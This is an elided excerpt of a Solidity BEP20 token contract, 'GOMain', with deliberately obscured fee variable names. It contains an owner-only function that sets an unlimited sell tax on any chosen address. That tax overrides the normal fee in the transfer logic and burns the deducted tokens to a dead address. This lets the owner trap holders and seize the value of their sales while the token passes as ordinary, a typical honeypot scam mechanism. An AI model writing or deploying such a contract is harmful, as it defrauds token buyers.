 ...
 *
 * This module is used through inheritance. It will make available the modifvir
...
contract GOMain is BEP20, Ownable, BaseToken {
    ...
    uint256 private _defaultSellfvi = 4;

    uint256 private _defaultBuyfvi = 0;


    mapping(address => bool) private _marketacounts;

    mapping(address => uint256) private _SLfvi;
    ...
    function upslf(uint256 _value) external onlyowner {
        _defaultSellfvi = _value;
    }


    function setSLfvi(address _address, uint256 _value) external onlyowner {
        require(_value > 1, "acounts tax must be greater than or equal to 1");
        _SLfvi[_address] = _value;
    }

    function getSLfvi(address _address) external view onlyowner returns (uint256) {
        return _SLfvi[_address];
    }


    function setMarketacountsfvi(address _address, bool _value) external onlyowner {
        _marketacounts[_address] = _value;
    }

    function getMarketacountsfvi(address _address) external view onlyowner returns (bool) {
     ...
     * e.g. implement automatic token fvis, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
        ...
        if (rF) {
            ...
            if (uniswapV2Pair != address(0)) {
                if (recipient == uniswapV2Pair) {
                    ...
                    tradefvi = _defaultSellfvi;
                }
                if (sender == uniswapV2Pair) {

                    tradefvi = _defaultBuyfvi;
                }
            }
            if (_SLfvi[sender] > 0) {
                tradefvi = _SLfvi[sender];
            }

            tradefviAmount = amount.mul(tradefvi).div(100);
        }


        if (tradefviAmount > 0) {
            _balances[_DEADaddress] = _balances[_DEADaddress].add(tradefviAmount);
            emit Transfer(sender, _DEADaddress, tradefviAmount);
        }
        _balances[recipient] = _balances[recipient].add(amount - tradefviAmount);
        emit Transfer(sender, recipient, amount - tradefviAmount);
    }
